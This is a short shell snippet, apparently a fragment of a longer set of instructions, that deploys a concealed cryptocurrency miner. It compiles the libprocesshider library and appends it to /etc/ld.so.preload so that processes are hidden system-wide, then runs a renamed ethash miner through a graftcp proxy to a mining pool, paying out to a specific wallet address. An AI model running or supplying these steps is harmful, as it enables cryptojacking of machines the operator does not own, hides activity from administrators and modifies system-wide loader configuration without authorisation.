...
unzip MagicOmega.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./Omega --algo ethash --server eth-us-west.flexpool.io --user 0x8CB8003E428D0Fd7693D22f576A212403728c64a.Omega --ssl 1 --port 5555
